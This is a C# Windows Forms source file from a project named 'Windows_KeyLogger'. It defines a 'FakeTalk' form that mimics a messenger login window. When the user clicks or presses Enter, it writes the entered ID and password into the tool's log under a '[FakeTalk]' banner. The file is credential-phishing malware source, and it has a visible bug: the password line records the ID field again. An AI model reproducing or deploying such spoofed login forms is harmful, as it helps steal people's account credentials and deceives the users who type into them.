using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows_KeyLogger
{
    public partial class FakeTalk : Form
    {
        public Form1 parent;
        public FakeTalk(Form1 parent)
        {
            InitializeComponent();
            this.parent = parent;
        }

        private void FakeTalk_Load(object sender, EventArgs e)
        {

        }
        protected override CreateParams CreateParams
        {
            get
            {
                const int CS_DROPSHADOW = 0x20000;
                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= CS_DROPSHADOW;
                return cp;
            }
        }

        private void saveInfo()
        {
            parent.richLog.AppendText("\n");
            parent.richLog.AppendText("=====[FakeTalk]=====\n");
            parent.richLog.AppendText("[ID] " + textBox1.Text + "\n");
            parent.richLog.AppendText("[PW] " + textBox1.Text + "\n");
            parent.richLog.AppendText("====================\n");
        }
        private void pictureBox3_Click(object sender, EventArgs e)
        {
            saveInfo();
        }

        private void FakeTalk_KeyPress(object sender, KeyPressEventArgs e)
        {
            if((int)(e.KeyChar) == 13)
            {
                saveInfo();
            }
        }

        private void textBox2_KeyPress(object sender, KeyPressEventArgs e)
        {
            if ((int)(e.KeyChar) == 13)
            {
                saveInfo();
            }
        }
    }
}
